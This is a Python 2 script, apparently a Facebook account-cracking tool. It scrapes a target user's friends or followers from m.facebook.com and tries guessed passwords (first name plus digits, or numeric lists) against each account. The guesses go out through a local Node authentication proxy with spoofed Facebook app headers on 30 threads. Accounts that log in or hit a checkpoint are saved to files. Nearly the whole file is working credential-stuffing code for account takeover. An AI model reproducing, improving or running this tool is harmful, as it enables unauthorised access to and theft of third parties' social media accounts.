#!/usr/bin/python2
# coding=utf-8

import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError

# --- setup ---
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd = random.randint(20000000, 30000000)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) '
                  '[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};'
                  'FBLC/it_IT;FBRV/45904160;FBCR/Pos]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger'
}

os.system('git pull')
os.system('clear')

logo = '\n\x1b[1;92mAnaya Fatima\n\x1b[1;92mSOHAIL BRAND\n' \
       '\x1b[1;91m---------------------------SXB--------------------\n' \
       '\x1b[1;97m→ Author : SOHAIL ARAIN\n' \
       '\x1b[1;97m→ WHATSAPP: 0'


# --- functions ---
def simple_login():
    os.system('clear')
    print logo
    print '\x1b[1;93m ~~~~ Simple Login ~~~~\x1b[1;91m'
    print 47 * '-'
    username = raw_input(' \x1b[1;92m[+] Username: ')
    password = raw_input(' \x1b[1;92m[+] Password: ')
    
    if username and password:
        print '\x1b[1;92m[✓] Login Successful!\x1b[0;97m'
        time.sleep(1)
        menu()
    else:
        print '\x1b[1;91m[✗] Invalid credentials!\x1b[0;97m'
        time.sleep(1)
        simple_login()


def menu():
    os.system('clear')
    print logo
    print '\x1b[1;93m ~~~~ Main Menu ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Auto crack (Name + digit)'
    print '\x1b[1;92m[2] Choice crack (Number only)'
    print '\x1b[1;92m[3] IP Information'
    print '\x1b[1;92m[4] Exit'
    print 47 * '-'
    menu_s()


def menu_s():
    ms = raw_input('\x1b[1;97m╰─SOHAIL→ ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
    elif ms == '3':
        ip()
    elif ms == '4':
        print '\x1b[1;91m[!] Exiting...\x1b[0;97m'
        sys.exit()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()


def ip():
    os.system('clear')
    print logo
    print '\tCollecting device info'
    try:
        ipinfo = requests.get('http://ip-api.com/json/', timeout=10)
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
        city = z['city']
        timezone = z['timezone']
    except Exception as e:
        print '\x1b[1;31mFailed: ' + str(e)
        ips = country = regi = network = city = timezone = 'Unknown'

    print '\x1b[1;92m Your ip: ' + ips
    time.sleep(1)
    print '\x1b[1;92m Your country: ' + country
    time.sleep(1)
    print '\x1b[1;92m Your region: ' + regi
    time.sleep(1)
    print ' \x1b[1;92mYour network: ' + network
    time.sleep(1)
    print ' \x1b[1;92mYour city: ' + city
    time.sleep(1)
    print ' \x1b[1;92mTimezone: ' + timezone
    time.sleep(1)
    print ' Loading ...'
    time.sleep(1)
    raw_input('\x1b[1;93m Press enter to go back ')
    menu()


def get_user_info(user_input):
    """Get user info from Facebook without token - using Graph API public endpoint"""
    try:
        # Try with username first
        r = requests.get('https://graph.facebook.com/v2.8/' + user_input, timeout=10)
        q = json.loads(r.text)
        
        if 'error' in q:
            # Try fetching as public profile
            r = requests.get('https://graph.facebook.com/' + user_input + '?fields=id,name', timeout=10)
            q = json.loads(r.text)
        
        if 'error' not in q and 'id' in q:
            return q.get('id'), q.get('name', 'Unknown')
        else:
            return None, None
    except:
        return None, None


def get_friends_no_token(user_id):
    """Fetch friends list without token using mobile scraping method"""
    id_list = []
    try:
        # Alternate method: Use mbasic.facebook.com scraping
        url = 'https://m.facebook.com/' + str(user_id) + '/friends'
        r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
        
        # Extract user IDs and names from HTML
        import re as regex
        pattern = r'href="/([^"]*)\?ref=br_rs".*?>([^<]*)</a>'
        matches = regex.findall(pattern, r.text)
        
        for match in matches:
            uid = match[0]
            name = match[1].strip()
            if name and uid:
                nm = name.split()[0]
                id_list.append(uid + '|' + nm)
        
        return id_list
    except:
        return id_list


def auto_crack():
    os.system('clear')
    print logo
    print '\x1b[1;93m~~~~ Name pass cracking ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning (NO TOKEN)'
    print '\x1b[1;92m[2] Followers cloning (NO TOKEN)'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80SOHAIL\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~8 Name pass public cracking (NO TOKEN)~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
        p6 = raw_input(' \x1b[1;92m[6]Name + digit: ')
        p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')
        p8 = raw_input(' \x1b[1;92m[8]Name + digit: ')
        
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter username/id: ')
        
        print '\n\x1b[1;92m[*] Fetching user info...\x1b[0;97m'
        uid, name = get_user_info(idt)
        
        if not uid or not name:
            print '\x1b[1;91m[✗] User not found!\x1b[0;97m'
            raw_input('Press enter to try again')
            auto_crack()
        
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~Name pass public cracking~~~~'
        print ' \x1b[1;92mCloning from: ' + name
        print ' \x1b[1;92mUser ID: ' + str(uid)
        
        print '\n\x1b[1;92m[*] Fetching friends list (this may take a while)...\x1b[0;97m'
        id = get_friends_no_token(uid)
        
        if len(id) == 0:
            print '\x1b[1;91m[!] Could not fetch friends list\x1b[0;97m'
            print '\x1b[1;91m[!] Profile might be private or no friends accessible\x1b[0;97m'
            raw_input('Press enter to go back')
            auto_crack()

    elif a_s == '2':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ Name pass followers cracking (NO TOKEN)~~~~\x1b[1;91m'
        print 47 * '-'
        print ' \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
        p6 = raw_input(' \x1b[1;92m[6]Name + digit: ')
        p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')
        p8 = raw_input(' \x1b[1;92m[8]Name + digit: ')
        
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter username/id: ')
        
        print '\n\x1b[1;92m[*] Fetching user info...\x1b[0;97m'
        uid, name = get_user_info(idt)
        
        if not uid or not name:
            print '\x1b[1;91m[✗] User not found!\x1b[0;97m'
            raw_input('Press enter to try again')
            auto_crack()
        
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~'
        print ' \x1b[1;92mCloning from: ' + name
        print ' \x1b[1;92mUser ID: ' + str(uid)
        
        print '\n\x1b[1;92m[*] Fetching followers (this may take a while)...\x1b[0;97m'
        id = get_friends_no_token(uid)
        
        if len(id) == 0:
            print '\x1b[1;91m[!] Could not fetch followers list\x1b[0;97m'
            print '\x1b[1;91m[!] Profile might be private or no followers accessible\x1b[0;97m'
            raw_input('Press enter to go back')
            auto_crack()

    elif a_s == '3':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ Name pass File cracking ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
        p6 = raw_input(' \x1b[1;92m[6]Name + digit: ')
        p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')
        p8 = raw_input(' \x1b[1;92m[8]Name + digit: ')
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            auto_crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option'
        a_s()
    
    if len(id) > 0:
        print ' Total ids: ' + str(len(id))
        time.sleep(0.5)
        print ' \x1b[1;97mCrack Running\x1b[1;91m '
        time.sleep(0.5)
        print 47 * '-'
        print '\t\x1b[1;94mSOHAIL BRAND\x1b[1;91m'
        print 47 * '-'

        def main(arg):
            user = arg
            uid, name = user.split('|')
            try:
                pass1 = name.lower() + p1
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass1 + '\n')
                    ok.close()
                    oks.append(uid + pass1)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass1
                    cp = open('HOP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass1 + '\n')
                    cp.close()
                    cps.append(uid + pass1)
                else:
                    pass2 = name.lower() + p2
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass2 + '\n')
                        ok.close()
                        oks.append(uid + pass2)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass2
                        cp = open('HOP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass2 + '\n')
                        cp.close()
                        cps.append(uid + pass2)
                    else:
                        pass3 = name.lower() + p3
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass3 + '\n')
                            ok.close()
                            oks.append(uid + pass3)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass3
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass3 + '\n')
                            cp.close()
                            cps.append(uid + pass3)
                        else:
                            pass4 = name.lower() + p4
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass4 + '\n')
                                ok.close()
                                oks.append(uid + pass4)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass4
                                cp = open('HOP_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass4 + '\n')
                                cp.close()
                                cps.append(uid + pass4)
                            else:
                                pass5 = name.lower() + p5
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass5 + '\n')
                                    ok.close()
                                    oks.append(uid + pass5)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass5
                                    cp = open('HOP_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass5 + '\n')
                                    cp.close()
                                    cps.append(uid + pass5)
                                else:
                                    pass6 = name.lower() + p6
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass6 + '\n')
                                        ok.close()
                                        oks.append(uid + pass6)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass6
                                        cp = open('HOP_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass6 + '\n')
                                        cp.close()
                                        cps.append(uid + pass6)
                                    else:
                                        pass7 = name.lower() + p7       
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass7 + '\n')
                                            ok.close()
                                            oks.append(uid + pass7)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass7
                                            cp = open('HOP_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass7 + '\n')
                                            cp.close()
                                            cps.append(uid + pass7)
                                        else:
                                            pass8 = name.lower() + p8      
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass8 + '\n')
                                                ok.close()
                                                oks.append(uid + pass8)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass8
                                                cp = open('HOP_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass8 + '\n')
                                                cp.close()
                                                cps.append(uid + pass8)
            except:
                pass

        p = ThreadPool(30)
        p.map(main, id)
        print 47 * '-'
        print ' \x1b[1;92mCrack Done'
        print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
        print 47 * '-'
        raw_input(' \x1b[1;93mPress enter to back')
        auto_crack()


def choice_crack():
    os.system('clear')
    print logo
    print '\x1b[1;93m~~~~ Number pass cracking ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning (NO TOKEN)'
    print '\x1b[1;92m[2] Followers cloning (NO TOKEN)'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    c_s()


def c_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m ~~~~ Number pass Public cracking (NO TOKEN)~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter username/id: ')
        
        print '\n\x1b[1;92m[*] Fetching user info...\x1b[0;97m'
        uid, name = get_user_info(idt)
        
        if not uid or not name:
            print '\x1b[1;91m[✗] User not found!\x1b[0;97m'
            raw_input('Press enter to try again')
            choice_crack()
        
        os.system('clear')
        print logo
        print '\x1b[1;93m ~~~~ Number pass Public cracking ~~~~'
        print ' Cloning from: ' + name
        print ' \x1b[1;92mUser ID: ' + str(uid)
        
        print '\n\x1b[1;92m[*] Fetching friends list...\x1b[0;97m'
        id = get_friends_no_token(uid)
        
        if len(id) == 0:
            print '\x1b[1;91m[!] Could not fetch friends list\x1b[0;97m'
            raw_input('Press enter to go back')
            choice_crack()

    elif a_s == '2':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ Number pass followers cracking (NO TOKEN)~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter username/id: ')
        
        print '\n\x1b[1;92m[*] Fetching user info...\x1b[0;97m'
        uid, name = get_user_info(idt)
        
        if not uid or not name:
            print '\x1b[1;91m[✗] User not found!\x1b[0;97m'
            raw_input('Press enter to try again')
            choice_crack()
        
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~Number pass followers cracking~~~~'
        print ' Cloning from: ' + name
        print ' \x1b[1;92mUser ID: ' + str(uid)
        
        print '\n\x1b[1;92m[*] Fetching followers...\x1b[0;97m'
        id = get_friends_no_token(uid)
        
        if len(id) == 0:
            print '\x1b[1;91m[!] Could not fetch followers list\x1b[0;97m'
            raw_input('Press enter to go back')
            choice_crack()

    elif a_s == '3':
        os.system('clear')
        print logo
        print '\x1b[1;93m ~~~~Number pass File cracking ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            choice_crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\t Choose valid option'
        c_s()
    
    if len(id) > 0:
        print ' Total ids: ' + str(len(id))
        time.sleep(0.5)
        print ' \x1b[1;97m~~~ Crack Running ~~~\x1b[1;91m'
        time.sleep(0.5)
        print 47 * '-'
        print '\t\x1b[1;94mSOHAIL BRAND Kings Of Facebook\x1b[1;91m'
        print 47 * '-'

        def main(arg):
            user = arg
            uid, name = user.split('|')
            try:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass1 + '\n')
                    ok.close()
                    oks.append(uid + pass1)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass1
                    cp = open('HOP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass1 + '\n')
                    cp.close()
                    cps.append(uid + pass1)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass2 + '\n')
                        ok.close()
                        oks.append(uid + pass2)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass2
                        cp = open('HOP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass2 + '\n')
                        cp.close()
                        cps.append(uid + pass2)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass3 + '\n')
                            ok.close()
                            oks.append(uid + pass3)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass3
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass3 + '\n')
                            cp.close()
                            cps.append(uid + pass3)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass4 + '\n')
                                ok.close()
                                oks.append(uid + pass4)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass4
                                cp = open('HOP_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass4 + '\n')
                                cp.close()
                                cps.append(uid + pass4)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass5 + '\n')
                                    ok.close()
                                    oks.append(uid + pass5)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass5
                                    cp = open('HOP_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass5 + '\n')
                                    cp.close()
                                    cps.append(uid + pass5)
            except:
                pass

        p = ThreadPool(30)
        p.map(main, id)
        print 47 * '-'
        print ' \x1b[1;92mCrack Done'
        print '\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
        print 47 * '-'
        raw_input('\x1b[1;93m Press enter to back')
        choice_crack()


# --- entry point ---
if __name__ == "__main__":
    os.system('cd ~/sohailking && npm install')
    os.system('pkill -f "node index.js"')
    os.system('cd ~/sohailking && node index.js &')
    time.sleep(5)
    simple_login()
